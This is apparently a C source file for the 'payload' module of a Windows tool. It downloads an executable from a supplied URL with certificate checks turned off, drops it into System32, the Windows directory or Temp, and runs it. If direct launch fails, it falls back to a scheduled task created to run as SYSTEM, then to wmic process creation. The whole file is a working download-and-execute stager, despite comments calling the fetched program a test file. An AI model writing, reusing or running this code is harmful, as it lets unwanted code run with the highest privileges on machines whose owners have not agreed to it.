/*
 * Payload implementation — download via WinHTTP, drop, execute.
 *
 * WinHTTP usage:
 *   WinHttpOpen → WinHttpConnect → WinHttpOpenRequest →
 *   WinHttpSendRequest → WinHttpReceiveResponse → WinHttpReadData
 *
 * Synchroniczny WinHTTP — async flag nie jest valid dla WinHttpOpenRequest.
 * Synchronous flow jest prostszy i bardziej niezawodny.
 *
 * The download buffer is written directly to disk (no unnecessary
 * memory buffering for large payloads). We use a 64KB chunk size.
 *
 * Error handling:
 *   — Network errors: retry once after 3 seconds
 *   — Disk errors: try alternative drop location
 *   — Execution errors: try alternative execution method (schtasks, WMI)
 *
 * xyz.exe to OSOBNY plik testowy (user's code). Nasza rola kończy się
 * na pobraniu go z URL i uruchomieniu jako SYSTEM. Resztą (test passed)
 * zajmuje się xyz.exe.
 */

#include "payload.h"
#include "utils.h"
#include <stdio.h>
#include <winhttp.h>

/* ── Fallback defines dla starszych MinGW ── */
#ifndef WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2
#define WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 0x00000800
#endif
#ifndef WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3
#define WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3 0x00002000
#endif


/* Chunk size for streaming download */
#define DOWNLOAD_CHUNK_SIZE 65536
#define MAX_URL_LENGTH     2048

/* ── Internal: build the full file path ── */

static int build_payload_path(char *szOut, DWORD dwOutSize,
                              const char *szFilename, DWORD dwDropLoc)
{
    char szWinDir[MAX_PATH];
    char szTempDir[MAX_PATH];

    switch (dwDropLoc)
    {
        case PAYLOAD_DROP_SYSTEM32:
            GetSystemDirectoryA(szWinDir, MAX_PATH);
            snprintf(szOut, dwOutSize, "%s\\%s", szWinDir, szFilename);
            break;

        case PAYLOAD_DROP_SYSTEM:
            GetWindowsDirectoryA(szWinDir, MAX_PATH);
            snprintf(szOut, dwOutSize, "%s\\%s", szWinDir, szFilename);
            break;

        case PAYLOAD_DROP_TEMP:
        default:
            GetTempPathA(MAX_PATH, szTempDir);
            snprintf(szOut, dwOutSize, "%s\\%s", szTempDir, szFilename);
            break;
    }

    return 0;
}

/* ── Internal: URL parsing (extract host, path, port from full URL) ── */

typedef struct _URL_PARTS {
    char szHost[256];
    char szPath[2048];
    int  nPort;
    BOOL bSecure;
} URL_PARTS;

static int parse_url(const char *szUrl, URL_PARTS *pParts)
{
    memset(pParts, 0, sizeof(URL_PARTS));

    /* Defaults */
    pParts->bSecure = FALSE;
    pParts->nPort   = 80;

    const char *p = szUrl;

    /* Skip protocol */
    if (strncmp(p, "https://", 8) == 0)
    {
        pParts->bSecure = TRUE;
        pParts->nPort   = 443;
        p += 8;
    }
    else if (strncmp(p, "http://", 7) == 0)
    {
        p += 7;
    }
    else
    {
        return 1; /* Unsupported protocol */
    }

    /* Extract host */
    int i = 0;
    while (*p && *p != '/' && *p != ':' && i < (int)sizeof(pParts->szHost) - 1)
    {
        pParts->szHost[i++] = *p++;
    }
    pParts->szHost[i] = '\0';

    /* Check for explicit port */
    if (*p == ':')
    {
        p++;
        pParts->nPort = 0;
        while (*p >= '0' && *p <= '9')
        {
            pParts->nPort = pParts->nPort * 10 + (*p - '0');
            p++;
        }
    }

    /* Extract path — everything remaining including / */
    if (*p)
    {
        lstrcpynA(pParts->szPath, p, (int)sizeof(pParts->szPath));
    }
    else
    {
        lstrcpyA(pParts->szPath, "/");
    }

    return 0;
}

/* ── Internal: download file via WinHTTP (SYNCHRONOUS) ── */

static int download_file(const char *szUrl, const char *szOutputPath)
{
    URL_PARTS parts;
    if (parse_url(szUrl, &parts) != 0)
    {
        DEBUG_PRINT("[payload] Failed to parse URL: %s\n", szUrl);
        return 1;
    }

    DEBUG_PRINT("[payload] Connecting to %s:%d%s\n",
                parts.szHost, parts.nPort, parts.szPath);

    /* Open WinHTTP session */
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        NULL, NULL,
        0
    );

    if (hSession == NULL)
    {
        DEBUG_PRINT("[payload] WinHttpOpen failed (%lu)\n", GetLastError());
        return 1;
    }

    /* Set connection timeout */
    DWORD dwTimeout = 15000;
    WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT,
                     &dwTimeout, sizeof(dwTimeout));
    WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT,
                     &dwTimeout, sizeof(dwTimeout));
    WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT,
                     &dwTimeout, sizeof(dwTimeout));

    /* Convert URLs parts to wide char */
    wchar_t wzHost[256];
    wchar_t wzPath[2048];
    MultiByteToWideChar(CP_UTF8, 0, parts.szHost, -1, wzHost, 256);
    MultiByteToWideChar(CP_UTF8, 0, parts.szPath, -1, wzPath, 2048);

    /* Connect to server */
    HINTERNET hConnect = WinHttpConnect(
        hSession, wzHost, (INTERNET_PORT)parts.nPort, 0
    );

    if (hConnect == NULL)
    {
        DEBUG_PRINT("[payload] WinHttpConnect failed (%lu)\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* Open request — SYNCHRONOUS mode (no WINHTTP_FLAG_ASYNCHRONOUS) */
    DWORD dwFlags = parts.bSecure ? WINHTTP_FLAG_SECURE : 0;

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", wzPath, NULL,
        NULL, NULL, dwFlags
    );

    if (hRequest == NULL)
    {
        DEBUG_PRINT("[payload] WinHttpOpenRequest failed (%lu)\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* Accept all TLS certs (we don't care about cert validation) */
    DWORD dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                       SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                       SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                       SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                     &dwSecFlags, sizeof(dwSecFlags));

    /* Enable TLS 1.2/1.3 */
    DWORD dwTlsProtocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 |
                           WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURE_PROTOCOLS,
                     &dwTlsProtocols, sizeof(dwTlsProtocols));

    /* Send request */
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0))
    {
        DEBUG_PRINT("[payload] WinHttpSendRequest failed (%lu)\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* Receive response */
    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        DEBUG_PRINT("[payload] WinHttpReceiveResponse failed (%lu)\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* Check HTTP status code */
    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL, &dwStatusCode, &dwSize, NULL);

    if (dwStatusCode != 200)
    {
        DEBUG_PRINT("[payload] Server returned HTTP %lu\n", dwStatusCode);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* Open output file */
    HANDLE hFile = CreateFileA(szOutputPath,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        DEBUG_PRINT("[payload] CreateFile failed (%lu) for %s\n",
                     GetLastError(), szOutputPath);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* Download in chunks */
    BYTE buffer[DOWNLOAD_CHUNK_SIZE];
    DWORD dwBytesRead = 0;
    DWORD dwTotalRead = 0;
    DWORD dwBytesWritten = 0;
    BOOL bSuccess = TRUE;

    while (bSuccess)
    {
        dwBytesRead = 0;
        if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &dwBytesRead))
        {
            DEBUG_PRINT("[payload] WinHttpReadData error at byte %lu (%lu)\n",
                         dwTotalRead, GetLastError());
            bSuccess = FALSE;
            break;
        }

        if (dwBytesRead == 0)
            break; /* Done */

        if (!WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL))
        {
            DEBUG_PRINT("[payload] WriteFile error at byte %lu\n", dwTotalRead);
            bSuccess = FALSE;
            break;
        }

        dwTotalRead += dwBytesWritten;
    }

    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (bSuccess && dwTotalRead > 0)
    {
        DEBUG_PRINT("[payload] Downloaded %lu bytes to %s\n",
                     dwTotalRead, szOutputPath);
        return 0;
    }

    /* Clean up partial download on failure */
    DeleteFileA(szOutputPath);
    DEBUG_PRINT("[payload] Download failed after %lu bytes\n", dwTotalRead);
    return 1;
}

/* ── Internal: execute the payload ── */

static int execute_payload(const char *szPath)
{
    /*
     * Execution strategy:
     *   1. Try CreateProcess (works if admin/SYSTEM)
     *   2. Fallback: scheduled task (runs as SYSTEM)
     *   3. Fallback: WMI Win32_Process.Create
     */

    char szCmd[MAX_PATH + 32];
    snprintf(szCmd, sizeof(szCmd), "\"%s\"", szPath);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;  /* xyz.exe sam sobie ogarnia UI */

    /* Method 1: Direct CreateProcess */
    if (CreateProcessA(
            NULL, szCmd,
            NULL, NULL, FALSE,
            0, NULL, NULL, &si, &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DEBUG_PRINT("[payload] Executed: %s (PID: %lu)\n", szPath, pi.dwProcessId);
        return 0;
    }

    DEBUG_PRINT("[payload] CreateProcess failed (%lu), trying schtasks...\n",
                 GetLastError());

    /* Method 2: Scheduled task (runs as SYSTEM) */
    char szTaskCmd[1024];
    snprintf(szTaskCmd, sizeof(szTaskCmd),
        "schtasks /Create /F /SC ONCE /TN \"MalinowyKozaczekTest\" "
        "/TR \"%s\" /ST 00:00 /RL HIGHEST /RU SYSTEM",
        szPath);

    si = (STARTUPINFOA){ sizeof(si) };
    if (CreateProcessA(
            "C:\\Windows\\System32\\cmd.exe",
            szTaskCmd,
            NULL, NULL, FALSE,
            CREATE_NO_WINDOW,
            NULL, NULL, &si, &pi))
    {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        /* Run the task */
        snprintf(szTaskCmd, sizeof(szTaskCmd),
            "schtasks /Run /TN \"MalinowyKozaczekTest\"");
        CreateProcessA("C:\\Windows\\System32\\cmd.exe",
            szTaskCmd, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        WaitForSingleObject(pi.hProcess, 1000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        DEBUG_PRINT("[payload] Executed via schtasks: %s\n", szPath);
        return 0;
    }

    DEBUG_PRINT("[payload] schtasks failed (%lu), trying WMI...\n",
                 GetLastError());

    /* Method 3: WMI Win32_Process.Create via wmic */
    snprintf(szTaskCmd, sizeof(szTaskCmd),
        "wmic process call create \"%s\"", szPath);

    if (CreateProcessA(
            "C:\\Windows\\System32\\cmd.exe",
            szTaskCmd, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DEBUG_PRINT("[payload] Executed via WMI: %s\n", szPath);
        return 0;
    }

    DEBUG_PRINT("[payload] All execution methods failed for: %s\n", szPath);
    return 1;
}

/* ── Public API ── */

int payload_fetch_and_exec(const char *szUrl,
                           const char *szFilename,
                           DWORD dwDropLoc)
{
    if (szUrl == NULL || szFilename == NULL)
        return 1;

    char szOutputPath[MAX_PATH];
    if (build_payload_path(szOutputPath, MAX_PATH, szFilename, dwDropLoc) != 0)
        return 1;

    DEBUG_PRINT("[payload] Target: %s → %s\n", szUrl, szOutputPath);

    /* Attempt download */
    int ret = download_file(szUrl, szOutputPath);

    /* Retry once after 3 seconds */
    if (ret != 0)
    {
        DEBUG_PRINT("[payload] Retrying download in 3 seconds...\n");
        Sleep(3000);
        ret = download_file(szUrl, szOutputPath);
    }

    if (ret != 0)
    {
        DEBUG_PRINT("[payload] Download failed after retry.\n");
        return 1;
    }

    /* Execute */
    return execute_payload(szOutputPath);
}
